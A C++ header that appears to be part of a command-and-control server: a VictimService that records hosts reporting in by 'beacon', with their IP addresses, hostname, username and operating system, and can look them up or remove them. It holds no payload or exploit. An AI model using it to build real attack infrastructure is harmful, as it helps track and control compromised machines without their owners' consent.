#pragma once

#include "VictimDAO.hpp"
#include "Types.hpp"
#include "IManager.hpp"

class IVictimService {
public:
    virtual ~IVictimService() = default;
    virtual VictimDAO upsert_from_beacon(const VictimDAO& victim) = 0;
    virtual std::optional<VictimDAO> get_by_uid(const UUID& uid) = 0;
    virtual bool remove_by_uid(const UUID& uid) = 0;
};

class VictimService final : public IVictimService {
public:
    explicit VictimService(Manager<VictimDAO, VictimRepository>& manager) : manager_(manager) {}

    VictimDAO upsert_from_beacon(const VictimDAO& victim) override {
        auto existing = manager_.get_by_uid(victim.uid);
        VictimDAO data = existing.value_or(VictimDAO{});
        data.uid = victim.uid;
        data.internal_ip = victim.internal_ip;
        data.external_ip = victim.external_ip;
        data.hostname = victim.hostname;
        data.username = victim.username;
        data.operating_system = victim.operating_system;
        data.last_update = victim.last_update;
        refresh_victim_status(data);

        if (existing.has_value()) {
            return manager_.update(existing->id, data).value();
        }
        return manager_.create(data);
    }

    std::optional<VictimDAO> get_by_uid(const UUID& uid) override {
        return manager_.get_by_uid(uid);
    }

    bool remove_by_uid(const UUID& uid) override {
        const auto victim = manager_.get_by_uid(uid);
        if (!victim.has_value()) {
            return false;
        }
        return manager_.remove(victim->id);
    }

private:
    Manager<VictimDAO, VictimRepository>& manager_;
};
